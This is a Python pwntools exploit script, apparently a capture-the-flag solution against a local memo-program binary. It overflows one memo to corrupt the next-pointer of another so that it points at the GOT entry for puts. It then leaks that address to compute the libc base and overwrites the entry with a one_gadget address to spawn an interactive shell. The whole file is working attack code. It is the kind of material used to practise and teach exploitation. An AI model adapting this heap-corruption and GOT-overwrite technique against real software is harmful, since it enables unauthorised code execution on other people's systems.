from pwn import *

elf = ELF('./chall')
libc = ELF('./libc.so.6')
io = process(elf.path)
context.binary = elf

one_gadget = [0xe3afe, 0xe3b01, 0xe3b04]

# create 2 memos
io.sendlineafter(b'> ', b'1')
io.recvuntil(b'0x')
memo1 = int(io.recvline().strip(), 16)
io.sendlineafter(b'Content: ', b'test1')
io.sendlineafter(b'> ', b'1')
io.recvuntil(b'0x')
memo2 = int(io.recvline().strip(), 16)
io.sendlineafter(b'Content: ', b'test2')

log.info(f'memo1: {hex(memo1)}')
log.info(f'memo2: {hex(memo2)}')

# edit memo2 next pointer to GOT puts
payload = b'a' * (memo2 - memo1 - 8)
payload += p64(elf.got['puts'] - 8)
io.sendlineafter(b'> ', b'2')
io.sendlineafter(b'index: ', b'0')
io.sendlineafter(b'New content: ', payload)

# get puts GOT address
io.sendlineafter(b'> ', b'2')
io.sendlineafter(b'index: ', b'2')
io.recvuntil(b'editing memo at 0x')
puts_got = int(io.recvline().strip(), 16)
libc_base = puts_got - libc.symbols['puts']
log.info(f'libc_base: {hex(libc_base)}')

# GOT overwrite
io.sendlineafter(b'New content: ', p64(libc_base + one_gadget[2]))

io.interactive()

